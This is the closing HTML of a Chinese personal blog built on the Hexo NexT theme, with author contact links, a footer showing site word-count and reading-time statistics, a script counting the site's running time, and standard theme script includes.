        <a href="mailto:acindd@yeah.net" title="E-Mail → mailto:acindd@yeah.net" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/yourname" title="Twitter(X) → https:&#x2F;&#x2F;twitter.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter(X)</a>
      </span>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">17k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">1:02</span>
</div>

<!-- <br /> -->
<!-- 网站运行时间的设置 -->
<span id="timeDate">载入天数...</span>
<!-- <span id="times">载入时分秒...</span> -->
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("10/8/2023 2:00:00");//此处修改你的建站时间或者网站上线时间
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); 
        if(String(snum).length ==1 ){snum = "0" + snum;}
        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
        document.getElementById("timeDate").innerHTML = " 👾营业已经："+dnum+" 天 "+hnum + " 时 " + mnum + " 分 " + snum + " 秒";
    }
setInterval("createtime()",250);
</script>


        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
